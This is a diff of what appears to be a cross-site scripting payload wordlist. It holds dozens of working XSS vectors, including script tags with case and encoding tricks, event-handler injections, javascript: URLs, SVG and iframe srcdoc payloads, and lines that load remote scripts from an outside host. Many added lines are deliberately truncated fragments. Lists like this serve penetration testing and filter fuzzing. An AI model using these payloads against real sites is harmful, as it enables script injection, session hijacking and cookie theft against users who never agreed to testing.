@@ -1,20 +1,26 @@
-<script>alert(1)</script>
+<script>alert(
 <Script>alert(1)</Script>
 <sCript>alert(document.domain)</sCript>
 <script>alert(123);</script>
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
 <script>alert(123)</script>
-<script>alert("hellox worldss");</script>
+<script>alert("
 <script>alert('XSS')</script> 
-<script>alert('XSS');</script>
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
 <script>alert('XSS')</script>
 '><script>alert('XSS')</script>
 <script>alert(/XSS/)</script>
 <script>alert(/XSS/)</script>
 </script><script>alert(1)</script>
+<iframe/onload=
 '; alert(1);
+<scr<script>ipt
+<script>alert(1)</script>
+<script>+-+-1-+-+alert(1)</script>
+<script>+-+-1-+-+alert(
 ')alert(1);//
+<script ~~~>alert
 <ScRiPt>alert(1)</sCriPt>
 <IMG SRC=jAVasCrIPt:alert('XSS')>
 <IMG SRC='javascript:alert('XSS');'>
@@ -169,40 +175,39 @@ javascript:alert(document.cookie)
 <x oncut=alert(1)>copy this! 
 <x ondblclick=alert(1)>double click this! 
 <x ondrag=alert(1)>drag this! 
-<x contenteditable onfocus=alert(1)>focus this! 
-<x contenteditable oninput=alert(1)>input here! 
-<x contenteditable onkeydown=alert(1)>press any key! 
-<x contenteditable onkeypress=alert(1)>press any key! 
-<x contenteditable onkeyup=alert(1)>press any key! 
-<x onmousedown=alert(1)>click this! 
-<x onmousemove=alert(1)>hover this! 
-<x onmouseout=alert(1)>hover this! 
-<x onmouseover=alert(1)>hover this! 
-<x onmouseup=alert(1)>click this! 
-<x contenteditable onpaste=alert(1)>paste here!
+<x contenteditable onfocus=alert(
+<x contenteditable oninput=alert(
+<x contenteditable onkeydown=alert(
+<x contenteditable onkeypress=alert( 
+<x contenteditable onkeyup=alert(
+<x onmousedown=alert(
+<x onmousemove=alert(
+<x onmouseout=alert(
+<x onmouseover=alert( 
+<x onmouseup=alert(
+<x contenteditable onpaste=alert(
 <script>alert(1)// 
 <script>alert(1)<!–
-<script src=//brutelogic.com.br/1.js> 
-<script src=//3334957647/1>
-%3Cx onxxx=alert(1) 
-<%78 onxxx=1 
-<x %6Fnxxx=1 
-<x o%6Exxx=1 
-<x on%78xx=1 
-<x onxxx%3D1
-<X onxxx=1 
-<x OnXxx=1 
-<X OnXxx=1 
+<script src=//
+%3Cx onxxx=alert(
+<%78 onxxx=1
+<x %6Fnxxx=1
+<x o%6Exxx=1
+<x on%78xx=1
+<x onxxx%3D
+<X onxxx=1
+<x OnXxx=1
+<X OnXxx=1
 <x onxxx=1 onxxx=1
-<x/onxxx=1 
-<x%09onxxx=1 
-<x%0Aonxxx=1 
-<x%0Conxxx=1 
-<x%0Donxxx=1 
-<x%2Fonxxx=1 
-<x 1='1'onxxx=1 
-<x 1="1"onxxx=1
-<x </onxxx=1 
+<x/onxxx=1
+<x%09onxxx=1
+<x%0Aonxxx=1
+<x%0Conxxx=1
+<x%0Donxxx=1
+<x%2Fonxxx=1
+<x 1='1'onxxx=1
+<x 1="1"onxxx=
+<x </onxxx=1
 <x 1=">" onxxx=1 
 <http://onxxx%3D1/
 <x onxxx=alert(1) 1='
@@ -227,8 +232,8 @@ javascript:alert(document.cookie)
 <form><input formaction=javascript:alert(1) type=image src=SOURCE> 
 <isindex formaction=javascript:alert(1) type=submit value=click> 
 <object data=javascript:alert(1)> 
-<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
-<svg><script xlink:href=data:,alert(1) /> 
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
 <math><brute xlink:href=javascript:alert(1)>click 
 <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
 <html ontouchstart=alert(1)> 
@@ -490,7 +495,7 @@ innerHTML=location.hash>#<script>alert(1)</script>
 <article onbeforecut="alert(1)" contenteditable>test</article>
 <article onbeforepaste="alert(1)" contenteditable>test</article>
 <article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
-<article onclick="alert(1)">test</article>
+<article onclick="alert(
 <article oncontextmenu="alert(1)">test</article>
 <article oncopy="alert(1)" contenteditable>test</article>
 <article oncut="alert(1)" contenteditable>test</article>
